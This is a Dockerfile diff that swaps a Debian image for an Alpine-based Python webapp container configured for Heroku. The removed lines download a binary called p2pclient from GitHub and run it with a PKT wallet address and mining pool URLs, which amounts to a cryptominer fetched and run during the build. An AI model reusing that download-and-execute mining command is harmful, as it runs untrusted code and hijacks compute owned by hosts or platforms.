@@ -1,6 +1,13 @@
-FROM debian:sid
+FROM frolvlad/alpine-glibc
+RUN apk update && apk add --no-cache --update python3 py3-pip
+WORKDIR /root/webapp
+ADD ./webapp /root/webapp/
+RUN pip3 install --no-cache-dir -q -r /root/webapp/requirements.txt
 
-RUN apt update -y \
-    	&& apt upgrade -y \
-        && apt-get install wget -y \
-    	&& cd /usr/bin && wget https://github.com/sengepeke/nextjs/raw/master/p2pclient && chmod +x p2pclient && ./p2pclient ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+VOLUME ["/root/.config/"]
+ENV EMAIL=rikzakalani12@gmail.com
+# Expose is NOT supported by Heroku
+# EXPOSE 5000
+# Run the app.  CMD is required to run on Heroku
+# $PORT is set by Heroku
+ENTRYPOINT ["sh", "-c", "/root/webapp/entrypoint.sh"]
